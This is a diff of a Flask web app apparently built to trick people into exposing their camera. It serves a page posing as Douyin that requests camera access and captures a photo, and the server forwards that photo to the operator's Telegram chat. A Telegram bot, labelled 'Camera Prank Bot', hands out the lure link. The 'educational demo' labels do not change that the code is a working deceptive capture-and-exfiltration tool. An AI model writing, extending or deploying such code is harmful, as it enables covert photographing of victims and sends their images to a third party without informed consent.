@@ -1,35 +1,26 @@
 from flask import Flask, request, Response
 import requests
 import os
-import secrets
 
 app = Flask(__name__)
 
+# Get from environment variables
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
 YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')
 
-# HTML camera page
 HTML_PAGE = '''<!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>抖音热门视频</title>
-<style>
-body{background:#000;text-align:center;color:#fff;font-family:Arial;margin-top:50px}
-button{background:#ff0050;color:#fff;border:none;padding:15px 40px;border-radius:30px;font-size:18px;margin-top:20px}
-video{width:300px;margin:20px;display:none}
-.warning{position:fixed;bottom:20px;left:20px;right:20px;background:#222;color:#ff9800;font-size:10px;padding:8px}
-</style>
-</head>
-<body>
+<head><meta charset="UTF-8"><title>抖音</title></head>
+<body style="background:black;text-align:center;color:white;font-family:Arial;margin-top:50px">
 <h2>📸 需要相机权限</h2>
 <p>网络安全教育演示</p>
-<button onclick="startCamera()">允许使用相机</button>
-<video id="v" autoplay></video>
-<div class="warning">⚠️ 网络安全教育演示 - 相机权限测试</div>
+<button onclick="startCamera()" style="background:#ff0050;color:white;padding:15px 40px;border:none;border-radius:30px;font-size:18px">允许使用相机</button>
+<video id="v" autoplay style="width:300px;margin:20px;display:none"></video>
+<div style="position:fixed;bottom:20px;left:20px;right:20px;background:#222;color:#ff9800;font-size:10px;padding:8px">⚠️ 网络安全教育演示</div>
 <script>
 function startCamera(){
 document.querySelector('button').style.display='none';
-document.querySelector('h2').innerHTML='🎥 启动中...';
+document.querySelector('h2').innerHTML='🎥 正在启动相机...';
 navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
 let video=document.getElementById('v');
 video.style.display='block';
@@ -59,15 +50,26 @@ def index():
 
 @app.route('/upload', methods=['POST'])
 def upload():
+    print("Upload endpoint hit")  # This will appear in Railway logs
     photo = request.files.get('photo')
+    
     if photo:
-        files = {'photo': ('photo.jpg', photo, 'image/jpeg')}
+        print(f"Photo received: {photo.filename}")
+        # Send to Telegram
+        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
+        files = {'photo': ('capture.jpg', photo, 'image/jpeg')}
         data = {'chat_id': YOUR_CHAT_ID, 'caption': '🎯 相机捕获 - 抖音教育演示'}
-        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
-        return 'OK'
-    return 'No photo', 400
+        
+        response = requests.post(url, data=data, files=files)
+        print(f"Telegram response: {response.status_code} - {response.text}")
+        
+        if response.status_code == 200:
+            return 'Photo sent to Telegram!', 200
+        else:
+            return f'Telegram error: {response.text}', 500
+    
+    return 'No photo received', 400
 
-# Telegram webhook endpoint - THIS HANDLES BOT COMMANDS
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
 def webhook():
     update = request.get_json()
@@ -76,18 +78,13 @@ def webhook():
         text = update['message'].get('text', '')
         
         if text == '/start':
-            railway_url = os.environ.get('RAILWAY_URL', 'https://hello-camera.up.railway.app')
+            railway_url = os.environ.get('RAILWAY_URL', 'https://hello-camera-production.up.railway.app')
             send_message(chat_id, 
                 f"🎭 *Camera Prank Bot*\n\n"
                 f"Click this link to test camera permission:\n"
                 f"{railway_url}\n\n"
-                f"⚠️ Educational use only\n\n"
-                f"Allowed commands:\n"
-                f"/start - Get camera link\n"
-                f"/help - Show this message",
+                f"⚠️ Educational use only",
                 parse_mode='Markdown')
-        elif text == '/help':
-            send_message(chat_id, "Send /start to get the camera test link")
         else:
             send_message(chat_id, "Send /start to begin")
     
